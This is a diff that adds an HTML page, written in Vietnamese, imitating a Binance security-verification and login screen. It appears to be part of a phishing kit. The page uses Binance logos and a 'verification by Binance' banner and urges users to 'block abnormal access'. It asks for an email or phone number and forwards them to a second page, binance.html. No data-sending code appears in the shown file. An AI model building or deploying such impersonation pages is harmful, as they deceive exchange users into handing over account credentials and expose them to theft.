@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1, safari=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Binance Security </title>
+    <!-- <link rel="stylesheet" href="style.css"> -->
+    <style>
+        .header {
+            height: 7vh;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-right: 2px;
+            padding-left: 2px;
+        }
+
+        .logo {
+            max-width: 80%;
+            max-height: 80%;
+
+        }
+
+        .more-icon {
+            max-width: 60%;
+            max-height: 60%;
+            margin-right: 2%;
+
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+
+        .security-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: rgb(254, 246, 216);
+            margin-top: 1%;
+            height: 5.5vh;
+            font-size: 14px;
+            width: 100%;
+        }
+
+        .lock {
+            height: 4vh;
+            width: 4vh;
+        }
+
+        .form-login {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin-top: 15px;
+
+        }
+
+        .email-sdt-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            width: 50vh;
+
+        }
+
+        .email-sdt {
+            font-weight: 400;
+            font-size: 14px;
+            color: rgb(30, 35, 41);
+        }
+
+        input {
+            height: 5.5vh;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            margin-top: 6px;
+
+        }
+
+        .next-btn {
+            width: 50vh;
+            height: 5.5vh;
+            border: 0px solid;
+            border-radius: 3px;
+            margin-top: 3px;
+            background-color: rgb(252, 213, 53);
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .signin-apple-btn {
+            width: 50vh;
+            height: 5.5vh;
+            border: 0px solid;
+            border-radius: 3px;
+            margin-top: 3px;
+            background-color: rgb(234, 236, 239);
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        @media only screen and (max-width: 768px) {
+            input {
+                width: 98.5%;
+            }
+
+            .email-sdt-container {
+                width: 94%;
+            }
+
+            .next-btn {
+                width: 94%;
+            }
+
+            .signin-apple-btn {
+                width: 94%;
+            }
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            display: flex;
+            flex-direction: row;
+            justify-content: space-evenly;
+        }
+        .footer-text {
+            color: rgb(71, 77, 87);
+            font-size: 14px;
+            width: 40%;
+            display: flex;
+            justify-content: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrapper">
+        <!-- header -->
+        <div class="header">
+            <img src="./Binance-Logo.png" alt="logo brand" class="logo">
+            <img src="./more.png" alt="more" class="more-icon">
+        </div>
+        <!-- security section -->
+        <div class="security-section">
+            <img src="./lock.png" class="lock">
+            <p>Xác minh bảo mật bởi <strong style="color: rgb(0, 196, 122); font-weight: bold;"> Binance </strong></p>
+        </div>
+        <!-- form signin -->
+        <div class="form-login">
+            <h2 style="padding-left: 15px; padding-right: 10px; font-weight: 600">Thực hiện bảo mật để chặn các truy cập bất thường</h2>
+            <div class="email-sdt-container">
+                <label class="email-sdt">Email/ Số điện thoại</label>
+                <input type="text">
+            </div>
+            <br>
+            <button class="next-btn" onclick="location.href='binance.html'"> Tiếp Theo </button>
+            <hr><span style="color:grey">hoặc</span>
+            <hr>
+
+
+            <button class="signin-apple-btn ">
+                <img src="./google.png" alt="google" style="max-width:60%; max-height:60%; padding-left:5px">
+                Tiếp tục với Google
+                <img style="padding-right: 8px;">
+            </button>
+            <button class="signin-apple-btn ">
+                <img src="./apple.png" alt="apple" style="max-width:75%; max-height:75%; padding-left:3px">
+                Tiếp tục với Apple
+                <img style="padding-right: 8px;">
+            </button>
+        </div>
+        <br />
+        <!-- footer -->
+        <div class="footer">
+            <div class="footer-text" >© 2017 - 2023 Binance.com. All rights reserved</div>
+            <div class="footer-text">Tùy chọn Cookie</div>
+        </div>
+    </div>
+</body>
+
+</html>
